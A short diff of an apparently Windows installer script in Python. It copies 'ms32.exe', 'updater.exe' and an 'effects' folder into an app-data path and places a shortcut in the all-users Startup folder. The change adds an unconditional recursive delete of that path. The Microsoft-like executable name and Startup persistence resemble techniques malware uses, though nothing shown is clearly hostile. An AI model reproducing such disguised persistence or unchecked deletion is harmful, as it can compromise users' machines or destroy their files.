@@ -28,7 +28,8 @@ destination_path_exe = os.path.join(appdata_path, 'ms32.exe')
 destination_folder = os.path.join(appdata_path, 'effects')
 destination_updater = os.path.join(appdata_path, 'updater.exe')
 destination_shortcut = r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\ms32.lnk"
-
+if os.path.exists(appdata_path):
+    shutil.rmtree(appdata_path)
 try:
     # Ensure the destination directory for the folder exists
     if not os.path.exists(appdata_path):
